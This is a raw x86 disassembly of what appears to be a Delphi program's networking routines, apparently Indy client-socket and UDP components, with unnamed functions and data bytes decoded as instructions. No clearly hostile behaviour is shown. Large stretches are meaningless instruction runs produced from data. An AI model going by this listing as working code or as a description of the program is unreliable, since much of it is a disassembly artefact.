add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x47 ] ah
sub_475659
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] dl
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
xor eax 0x35600040
dec ebp
popad
js r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x43644945 ] dl
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
mov al [ 0xffffffffac004755 ]
inc cx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push edi
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
add [ edi + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
xor [ eax + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop eax
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax 0x355c0040
inc eax
imul ebp [ esi + 0x64 ] 0x74726f50
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
inc eax
add [ edi + edx * 2 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x47 ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
arpl [ ebx + 0x65 ] bp
je r-xdata
ror al 0x57
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ eax ] al
[ eax ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_471d08
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_475d3c
sub_47571c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
xor [ eax + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop eax
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax 0x355c0040
inc eax
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
ror al 0x57
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_471d08
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_475d3c
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x43644945 ] dl
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push edi
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
inc eax
add [ edi + edx * 2 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
add [ edi + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
sub_475844
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_471d08
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_475d3c
sub_4758b4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_475cf4
mov eax ebx
call sub_475d18
sub_4758ec
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419684
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47591c
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_475940
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_475964
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471cb4
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4759a4
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_4759d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_475ae4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_475d6c
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475aeb
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40413c
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_475dc0
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
jmp r-xdata
sub_475af0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_40416c
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_475b0c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_41964c
mov dl 0x1
mov eax edi
call sub_475d3c
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_475b64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475c95
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_474eac
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_475c78
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418b9c
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_474e68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_475b64
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_475b64
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475c9c
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_475ca8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_40416c
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_40416c
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_4192f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_475cf4
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_475d18
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_475d3c
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404118
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404118
xor eax eax
mov [ ebx + 0x1c ] eax
sub_475d6c
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471cc0
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_475cf4
sub_475dc0
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_475d6c
test al al
je r-xdata
sub_475df0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_475e15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e1c
retn
sub_475ed4
inc edi
add [ edx ] cl
push esp
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
inc edx
jne r-xdata
lea eax [ eax ]
call 0x747a647
or dl [ ecx + ecx * 2 + 0x64 ]
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
insd
jb r-xdata
pushad
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x72421000
je r-xdata
imul edi [ edx + 0x65 ] r-xdata
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_4760f0
retn
add [ eax ] 0x0
inc esp
inc edi
add al dl
push ecx
inc edi
add [ esi ] al
add [ ecx ] cl
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] al
add dh bh
mov [ eax + 0x47 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
cmp al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
sub_475f36
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x20
add [ eax ] al
add al 0x0
or al [ edx + 0x75 ]
jb r-xdata
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
inc esp
pushad
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x72421000
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_4760f0
retn
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_475f98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
mov [ esi + 0x6c ] 0x2000
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_475fdc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_476088
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4752b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_476028
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_475b0c
mov [ ebx + 0x68 ] eax
mov eax [ ebx + 0x68 ]
pop esi
pop ebx
retn
xor ecx ecx
mov edx 0x2
call sub_475844
mov eax ebx
mov si 0xffef
call sub_403518
sub_476088
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x70 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_4760c4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x80 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x80 ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax ebx
mov si 0xffef
call sub_403518
sub_4760f0
push ecx
cmp dl 0x1
cmc
sbb edx edx
mov [ esp ] edx
test ecx ecx
jne r-xdata
mov eax esp
push eax
push 0x4
mov edx 0xffff
mov eax ecx
mov ecx 0x20
call sub_475964
pop edx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx eax
sub_476120
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476145
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47614c
retn
sub_4762e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476305
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47630c
retn
sub_47643c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476461
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476468
retn
sub_476784
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
mov eax [ ebp - 0x8 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47682b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476832
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + esi - 0x1 ]
call sub_404300
mov eax [ ebp - 0x10 ]
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ ebp - 0x8 ]
call edi
test eax eax
jle r-xdata
cmp eax [ ebp - 0xc ]
jge r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] eax
sub_47683c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
mov eax [ ebp - 0x8 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4768e8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043d8
test eax eax
je r-xdata
mov edi 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4768ef
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov esi eax
test esi esi
jle r-xdata
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
mov edi ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov eax [ ebp - 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ ebp - 0x4 ]
call ecx
test eax eax
jne r-xdata
sub_4768f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
